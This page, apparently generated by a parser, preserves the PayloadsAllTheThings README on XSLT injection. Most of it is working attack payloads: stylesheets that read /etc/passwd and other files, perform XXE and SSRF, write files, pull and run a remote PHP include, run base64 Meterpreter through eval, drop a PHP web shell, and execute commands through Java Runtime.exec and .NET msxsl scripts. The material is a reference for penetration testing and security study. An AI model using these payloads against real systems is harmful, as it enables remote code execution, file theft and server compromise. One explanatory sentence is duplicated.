---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# XSLT Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xslt-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSLT Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [XSLT Injection](../../topics/xslt-injection/xslt-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xslt-injection-readme |
| name | XSLT Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# XSLT Injection\n\n> Processing an un-validated XSL stylesheet can allow an attacker to change the structure and\
  \ contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code\n\n## Summary\n\
  \n- [Tools](#tools)\n- [Methodology](#methodology)\n    - [Determine the Vendor And Version](#determine-the-vendor-and-version)\n\
  \    - [External Entity](#external-entity)\n    - [Read Files and SSRF Using Document](#read-files-and-ssrf-using-document)\n\
  \    - [Write Files with EXSLT Extension](#write-files-with-exslt-extension)\n    - [Remote Code Execution with PHP Wrapper](#remote-code-execution-with-php-wrapper)\n\
  \    - [Remote Code Execution with Java](#remote-code-execution-with-java)\n    - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)\n\
  - [Labs](#labs)\n- [References](#references)\n\n## Tools\n\nNo known tools currently exist to assist with XSLT exploitation.\n\
  \n## Methodology\n\n### Determine the Vendor and Version\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<xsl:stylesheet\
  \ version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/fruits\">\n <xsl:value-of\
  \ select=\"system-property('xsl:vendor')\"/>\n  </xsl:template>\n</xsl:stylesheet>\n```\n\n```xml\n<?xml version=\"1.0\"\
  \ encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"\
  >\n<body>\n<br />Version: <xsl:value-of select=\"system-property('xsl:version')\" />\n<br />Vendor: <xsl:value-of select=\"\
  system-property('xsl:vendor')\" />\n<br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />\n</body>\n\
  </html>\n```\n\n### External Entity\n\nDon't forget to test for XXE when you encounter XSLT files.\n\n```xml\n<?xml version=\"\
  1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]>\n<xsl:stylesheet version=\"\
  1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/fruits\">\n    Fruits &ext_file;:\n\
  \    <!-- Loop for each fruit -->\n    <xsl:for-each select=\"fruit\">\n      <!-- Print name: description -->\n      -\
  \ <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>\n    </xsl:for-each>\n  </xsl:template>\n</xsl:stylesheet>\n\
  ```\n\n### Read Files and SSRF Using Document\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<xsl:stylesheet version=\"\
  1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:template match=\"/fruits\">\n    <xsl:copy-of select=\"\
  document('http://172.16.132.1:25')\"/>\n    <xsl:copy-of select=\"document('/etc/passwd')\"/>\n    <xsl:copy-of select=\"\
  document('file:///c:/winnt/win.ini')\"/>\n    Fruits:\n     <!-- Loop for each fruit -->\n    <xsl:for-each select=\"fruit\"\
  >\n      <!-- Print name: description -->\n      - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"\
  />\n    </xsl:for-each>\n  </xsl:template>\n</xsl:stylesheet>\n```\n\n### Write Files with EXSLT Extension\n\nEXSLT, or\
  \ Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations)\
  \ language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet\
  \ Language Transformations) language.\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xsl:stylesheet\n  xmlns:xsl=\"\
  http://www.w3.org/1999/XSL/Transform\"\n  xmlns:exploit=\"http://exslt.org/common\" \n  extension-element-prefixes=\"exploit\"\
  \n  version=\"1.0\">\n  <xsl:template match=\"/\">\n    <exploit:document href=\"evil.txt\" method=\"text\">\n      Hello\
  \ World!\n    </exploit:document>\n  </xsl:template>\n</xsl:stylesheet>\n```\n\n### Remote Code Execution with PHP Wrapper\n\
  \nExecute the function `readfile`.\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"\
  http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n<body>\n<xsl:value-of select=\"php:function('readfile','index.php')\"\
  \ />\n</body>\n</html>\n```\n\nExecute the function `scandir`.\n\n```xml\n<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\
  \ xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template match=\"/\">\n    <xsl:value-of name=\"assert\" select=\"\
  php:function('scandir', '.')\"/>\n  </xsl:template>\n</xsl:stylesheet>\n```\n\nExecute a remote php file using `assert`\n\
  \n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\
  \ xmlns:php=\"http://php.net/xsl\">\n<body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\">\n  <xsl:variable\
  \ name=\"payload\">\n    include(\"http://10.10.10.10/test.php\")\n  </xsl:variable>\n  <xsl:variable name=\"include\" select=\"\
  php:function('assert',$payload)\"/>\n</body>\n</html>\n```\n\nExecute a PHP meterpreter using PHP wrapper.\n\n```xml\n<xsl:stylesheet\
  \ xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template\
  \ match=\"/\">\n    <xsl:variable name=\"eval\">\n      eval(base64_decode('Base64-encoded Meterpreter code'))\n    </xsl:variable>\n\
  \    <xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>\n  </xsl:template>\n</xsl:stylesheet>\n\
  ```\n\nExecute a remote php file using `file_put_contents`\n\n```xml\n<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\
  \ xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n  <xsl:template match=\"/\">\n    <xsl:value-of select=\"php:function('file_put_contents','/var/www/webshell.php','&lt;?php\
  \ echo system($_GET[&quot;command&quot;]); ?&gt;')\" />\n  </xsl:template>\n</xsl:stylesheet>\n```\n\n### Remote Code Execution\
  \ with Java\n\n```xml\n  <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"\
  http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\n \
  \   <xsl:template match=\"/\">\n      <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\n      <xsl:variable\
  \ name=\"process\" select=\"rt:exec($rtobject,'ls')\"/>\n      <xsl:variable name=\"processString\" select=\"ob:toString($process)\"\
  />\n      <xsl:value-of select=\"$processString\"/>\n    </xsl:template>\n  </xsl:stylesheet>\n```\n\n```xml\n<xml version=\"\
  1.0\"?>\n<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\"\
  >\n<xsl:template match=\"/\">\n<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"\
  java:java.lang.Runtime\"/>\n</xsl:template>.\n</xsl:stylesheet>\n```\n\n### Remote Code Execution with Native .NET\n\n```xml\n\
  <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\
  \ xmlns:App=\"http://www.tempuri.org/App\">\n    <msxsl:script implements-prefix=\"App\" language=\"C#\">\n      <![CDATA[\n\
  \        public string ToShortDateString(string date)\n          {\n              System.Diagnostics.Process.Start(\"cmd.exe\"\
  );\n              return \"01/01/2001\";\n          }\n      ]]>\n    </msxsl:script>\n    <xsl:template match=\"ArrayOfTest\"\
  >\n      <TABLE>\n        <xsl:for-each select=\"Test\">\n          <TR>\n          <TD>\n            <xsl:value-of select=\"\
  App:ToShortDateString(TestDate)\" />\n          </TD>\n          </TR>\n        </xsl:for-each>\n      </TABLE>\n    </xsl:template>\n\
  </xsl:stylesheet>\n```\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"\
  http://www.w3.org/1999/XSL/Transform\"\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"urn:my-scripts\">\n\
  \n<msxsl:script language = \"C#\" implements-prefix = \"user\">\n<![CDATA[\npublic string execute(){\nSystem.Diagnostics.Process\
  \ proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\";\nproc.StartInfo.RedirectStandardOutput\
  \ = true;\nproc.StartInfo.UseShellExecute = false;\nproc.StartInfo.Arguments = \"/c dir\";\nproc.Start();\nproc.WaitForExit();\n\
  return proc.StandardOutput.ReadToEnd();\n}\n]]>\n</msxsl:script>\n\n  <xsl:template match=\"/fruits\">\n  --- BEGIN COMMAND\
  \ OUTPUT ---\n <xsl:value-of select=\"user:execute()\"/>\n  --- END COMMAND OUTPUT --- \n  </xsl:template>\n</xsl:stylesheet>\n\
  ```\n\n## Labs\n\n- [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)\n\
  \n## References\n\n- [From XSLT code execution to Meterpreter shells - Nicolas Grégoire (@agarri) - July 2, 2012](https://web.archive.org/web/20190820014239/https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)\n\
  - [XSLT Injection - Fortify - January 16, 2021](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)\n\
  - [XSLT Injection Basics - Saxon - Hunnic Cyber Team - August 21, 2019](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)\n\
  - [Getting XXE in Web Browsers using ChatGPT - Igor Sak-Sakovskiy - May 22, 2024](https://web.archive.org/web/20260121165846/https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)\n\
  - [XSLT injection lead to file creation - PT SWARM (@ptswarm) - May 30, 2024](https://web.archive.org/web/20241006180803/https://twitter.com/ptswarm/status/1796162911108255974/photo/1)"
_relative_path: XSLT Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSLT Injection/README.md
````
